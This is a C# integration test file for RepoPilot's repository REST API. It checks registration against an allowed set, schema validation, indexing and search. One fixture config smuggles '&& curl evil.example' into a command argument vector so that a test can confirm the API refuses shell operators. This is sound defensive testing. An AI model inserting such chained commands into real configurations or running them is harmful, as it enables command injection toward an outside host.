using System.Net;
using System.Net.Http.Json;
using System.Text.Json;
using Microsoft.AspNetCore.Hosting;
using Microsoft.AspNetCore.Mvc.Testing;
using RepoPilot.IntegrationTests.Infrastructure;
using Xunit;

namespace RepoPilot.IntegrationTests.Contracts;

/// <summary>
/// The repository endpoints against <c>contracts/rest-api.yaml</c>.
/// <para>
/// Registration is the boundary where a fixture stops being a directory on disk
/// and becomes something the agent may act on, so the refusals matter as much as
/// the success: a slug outside the allowed set, a config that fails its schema,
/// and a command that assumes a shell are all declined here rather than at the
/// point of execution.
/// </para>
/// </summary>
[Collection(PostgresCollection.Name)]
public sealed class RepositoryApiContractTests(PostgresFixture postgres) : IAsyncLifetime
{
    private static readonly JsonSerializerOptions Json = new(JsonSerializerDefaults.Web);

    private WebApplicationFactory<Program>? _factory;
    private string? _fixturesRoot;

    /// <summary>
    /// Slugs are unique per test instance.
    /// <para>
    /// xUnit builds a new instance per test, so each one gets its own fixtures
    /// directory — but the database is shared across the class. A fixed slug
    /// would make the second test collide with the first's registration, and
    /// worse, that registration would point at a directory the first test had
    /// already deleted.
    /// </para>
    /// </summary>
    private readonly string _suffix = Guid.NewGuid().ToString("N")[..8];

    /// <summary>The slug the host is configured to allow.</summary>
    private string AllowedSlug => $"contract-fixture-{_suffix}";

    /// <summary>Present on disk but absent from the allowed set.</summary>
    private string UnlistedSlug => $"unlisted-fixture-{_suffix}";

    private string BadSchemaSlug => $"bad-schema-{_suffix}";

    private string ShellCommandSlug => $"shell-command-{_suffix}";

    private string NoConfigSlug => $"no-config-{_suffix}";

    public Task InitializeAsync()
    {
        if (postgres.ConnectionString is null)
        {
            return Task.CompletedTask;
        }

        _fixturesRoot = Directory.CreateTempSubdirectory("repopilot-fixtures-").FullName;

        WriteFixture(AllowedSlug, ValidConfig(AllowedSlug));
        WriteFixture(UnlistedSlug, ValidConfig(UnlistedSlug));
        WriteFixture(BadSchemaSlug, $$"""{"slug":"{{BadSchemaSlug}}"}""");
        WriteFixture(ShellCommandSlug, ShellOperatorConfig(ShellCommandSlug));
        WriteFixture(NoConfigSlug, null);

        _factory = new WebApplicationFactory<Program>().WithWebHostBuilder(builder =>
        {
            builder.UseSetting("ConnectionStrings:RepoPilot", postgres.ConnectionString);
            builder.UseSetting("RepoPilot:Workspace:FixturesRoot", _fixturesRoot);
            builder.UseSetting("RepoPilot:Workspace:Root",
                Path.Combine(_fixturesRoot, ".workspace"));

            // The allowed set is deployment configuration. Everything on disk
            // that is not listed here must be refused however it is requested.
            builder.UseSetting("RepoPilot:AllowedRepositories:Slugs:0", AllowedSlug);
            builder.UseSetting("RepoPilot:AllowedRepositories:Slugs:1", BadSchemaSlug);
            builder.UseSetting("RepoPilot:AllowedRepositories:Slugs:2", ShellCommandSlug);
            builder.UseSetting("RepoPilot:AllowedRepositories:Slugs:3", NoConfigSlug);
        });

        _factory.CreateClient().Dispose();

        return Task.CompletedTask;
    }

    public Task DisposeAsync()
    {
        _factory?.Dispose();

        if (_fixturesRoot is not null && Directory.Exists(_fixturesRoot))
        {
            Directory.Delete(_fixturesRoot, recursive: true);
        }

        return Task.CompletedTask;
    }

    private HttpClient Client() => _factory!.CreateClient();

    private void WriteFixture(string slug, string? config)
    {
        var root = Path.Combine(_fixturesRoot!, slug);
        Directory.CreateDirectory(Path.Combine(root, "src"));

        File.WriteAllText(
            Path.Combine(root, "src", "Service.cs"),
            "namespace Sample;\n\npublic sealed class Service\n{\n    public int Value => 42;\n}\n");

        if (config is not null)
        {
            File.WriteAllText(Path.Combine(root, "repopilot.fixture.json"), config);
        }
    }

    private static string ValidConfig(string slug) => $$"""
        {
          "slug": "{{slug}}",
          "displayName": "Contract fixture",
          "sandbox": { "image": "alpine:3", "workdir": "/workspace" },
          "commands": [
            { "name": "unit", "argv": ["true"], "purpose": "verify" }
          ]
        }
        """;

    /// <summary>A config whose argv assumes a shell (FR-022a).</summary>
    private static string ShellOperatorConfig(string slug) => $$"""
        {
          "slug": "{{slug}}",
          "displayName": "Shell command fixture",
          "sandbox": { "image": "alpine:3", "workdir": "/workspace" },
          "commands": [
            { "name": "unit", "argv": ["true", "&& curl evil.example"], "purpose": "verify" }
          ]
        }
        """;

    // ---- POST /api/repositories ---------------------------------------------

    [RequiresDockerFact]
    public async Task RegisteringAnAllowedFixtureSucceeds()
    {
        var response = await Client().PostAsJsonAsync(
            "/api/repositories", new { slug = AllowedSlug });

        Assert.Equal(HttpStatusCode.Created, response.StatusCode);

        var repository = await response.Content.ReadFromJsonAsync<JsonElement>(Json);

        Assert.Equal(AllowedSlug, repository.GetProperty("slug").GetString());
        Assert.Equal("never_indexed", repository.GetProperty("indexingStatus").GetString());
        Assert.Equal(JsonValueKind.Null, repository.GetProperty("activeIndexVersion").ValueKind);

        // Command names, not argument vectors. Showing the vectors would invite
        // the idea that they are editable through the API; they are committed
        // repository configuration (FR-022b).
        Assert.Equal("unit", repository.GetProperty("testCommands")[0].GetString());
    }

    [RequiresDockerFact]
    public async Task AFixtureOutsideTheAllowedSetIsRefusedEvenThoughItExistsOnDisk()
    {
        var response = await Client().PostAsJsonAsync(
            "/api/repositories", new { slug = UnlistedSlug });

        // FR-001. Present and well-formed on disk, and still refused — the
        // allowed set is the control, not the filesystem.
        Assert.Equal(HttpStatusCode.UnprocessableEntity, response.StatusCode);
        await AssertProblemAsync(response);
    }

    [RequiresDockerFact]
    public async Task AFixtureWhoseConfigFailsItsSchemaIsRefused()
    {
        var response = await Client().PostAsJsonAsync(
            "/api/repositories", new { slug = BadSchemaSlug });

        Assert.Equal(HttpStatusCode.UnprocessableEntity, response.StatusCode);

        var problem = await response.Content.ReadFromJsonAsync<JsonElement>(Json);
        Assert.Contains("invalid", problem.GetProperty("detail").GetString()!, StringComparison.OrdinalIgnoreCase);
    }

    [RequiresDockerFact]
    public async Task AFixtureWithAShellOperatorInItsCommandIsRefused()
    {
        var response = await Client().PostAsJsonAsync(
            "/api/repositories", new { slug = ShellCommandSlug });

        // FR-022a. The sandbox would pass this through as a literal argument, so
        // it would not do what its author intended — and discovering that at
        // registration beats discovering it when a test silently does not run.
        Assert.Equal(HttpStatusCode.UnprocessableEntity, response.StatusCode);

        var problem = await response.Content.ReadFromJsonAsync<JsonElement>(Json);
        Assert.Contains("shell operator", problem.GetProperty("detail").GetString()!);
    }

    [RequiresDockerFact]
    public async Task AFixtureWithNoConfigIsRefused()
    {
        var response = await Client().PostAsJsonAsync(
            "/api/repositories", new { slug = NoConfigSlug });

        Assert.Equal(HttpStatusCode.UnprocessableEntity, response.StatusCode);
    }

    [RequiresDockerFact]
    public async Task RegisteringTheSameFixtureTwiceConflicts()
    {
        var client = Client();

        var first = await client.PostAsJsonAsync("/api/repositories", new { slug = AllowedSlug });
        Assert.Equal(HttpStatusCode.Created, first.StatusCode);

        var second = await client.PostAsJsonAsync("/api/repositories", new { slug = AllowedSlug });
        Assert.Equal(HttpStatusCode.Conflict, second.StatusCode);
    }

    // ---- GET, index, search --------------------------------------------------

    [RequiresDockerFact]
    public async Task IndexingReportsTheCountsAndTheReasonBreakdown()
    {
        var client = Client();
        var id = await RegisterAsync(client);

        var response = await client.PostAsync($"/api/repositories/{id}/index", null);

        Assert.Equal(HttpStatusCode.Accepted, response.StatusCode);

        var status = await response.Content.ReadFromJsonAsync<JsonElement>(Json);

        Assert.Equal("indexed", status.GetProperty("status").GetString());

        // Two: the source file and repopilot.fixture.json. The fixture's own
        // config is indexed like any other committed text — it describes the
        // repository, and an agent asking "how are tests run here" should find
        // it rather than be told nothing exists.
        Assert.Equal(2, status.GetProperty("includedFileCount").GetInt32());
        Assert.True(status.TryGetProperty("exclusionBreakdown", out _));
    }

    [RequiresDockerFact]
    public async Task AnIndexedRepositoryReportsItsStatusAndVersion()
    {
        var client = Client();
        var id = await RegisterAsync(client);

        await client.PostAsync($"/api/repositories/{id}/index", null);

        var repository = await client.GetFromJsonAsync<JsonElement>(
            $"/api/repositories/{id}", Json);

        Assert.Equal("indexed", repository.GetProperty("indexingStatus").GetString());
        Assert.Equal(1, repository.GetProperty("activeIndexVersion").GetInt32());
        Assert.NotEqual(
            JsonValueKind.Null, repository.GetProperty("lastIndexedAt").ValueKind);
    }

    [RequiresDockerFact]
    public async Task RegisteredRepositoriesAreListed()
    {
        var client = Client();
        var id = await RegisterAsync(client);

        var all = await client.GetFromJsonAsync<JsonElement>("/api/repositories", Json);

        Assert.Contains(
            all.EnumerateArray(),
            r => r.GetProperty("id").GetGuid() == id);
    }

    [RequiresDockerFact]
    public async Task AnUnknownRepositoryIsNotFound()
    {
        var response = await Client().GetAsync($"/api/repositories/{Guid.NewGuid()}");

        Assert.Equal(HttpStatusCode.NotFound, response.StatusCode);
        await AssertProblemAsync(response);
    }

    [RequiresDockerFact]
    public async Task SearchReturnsPathLineRangeAndScore()
    {
        var client = Client();
        var id = await RegisterAsync(client);

        await client.PostAsync($"/api/repositories/{id}/index", null);

        var results = await client.GetFromJsonAsync<JsonElement>(
            $"/api/repositories/{id}/search?q=Service", Json);

        var hit = results[0];

        // FR-004: enough to locate the code, not just to know it exists.
        Assert.Equal("src/Service.cs", hit.GetProperty("relativePath").GetString());
        Assert.True(hit.GetProperty("startLine").GetInt32() >= 1);
        Assert.True(hit.GetProperty("endLine").GetInt32() >= hit.GetProperty("startLine").GetInt32());
        Assert.True(hit.GetProperty("score").GetDouble() > 0);
        Assert.False(string.IsNullOrEmpty(hit.GetProperty("content").GetString()));
    }

    [RequiresDockerFact]
    public async Task SearchingAnUnindexedRepositoryIsRefusedRatherThanReturningNothing()
    {
        var client = Client();
        var id = await RegisterAsync(client);

        var response = await client.GetAsync($"/api/repositories/{id}/search?q=Service");

        // "No results" and "there is nothing to search" are different facts, and
        // conflating them makes an unindexed repository look like a bad query.
        Assert.Equal(HttpStatusCode.Conflict, response.StatusCode);
    }

    [RequiresDockerFact]
    public async Task SearchRequiresAQuery()
    {
        var client = Client();
        var id = await RegisterAsync(client);

        await client.PostAsync($"/api/repositories/{id}/index", null);

        var response = await client.GetAsync($"/api/repositories/{id}/search?q=");

        Assert.Equal(HttpStatusCode.UnprocessableEntity, response.StatusCode);
    }

    /// <summary>Registers this test instance's fixture.</summary>
    private async Task<Guid> RegisterAsync(HttpClient client)
    {
        var response = await client.PostAsJsonAsync(
            "/api/repositories", new { slug = AllowedSlug });

        Assert.Equal(HttpStatusCode.Created, response.StatusCode);

        return (await response.Content.ReadFromJsonAsync<JsonElement>(Json))
            .GetProperty("id").GetGuid();
    }

    private static async Task AssertProblemAsync(HttpResponseMessage response)
    {
        Assert.Equal("application/problem+json", response.Content.Headers.ContentType?.MediaType);

        var problem = await response.Content.ReadFromJsonAsync<JsonElement>(Json);
        Assert.True(problem.TryGetProperty("title", out _));
        Assert.Equal((int)response.StatusCode, problem.GetProperty("status").GetInt32());
    }
}
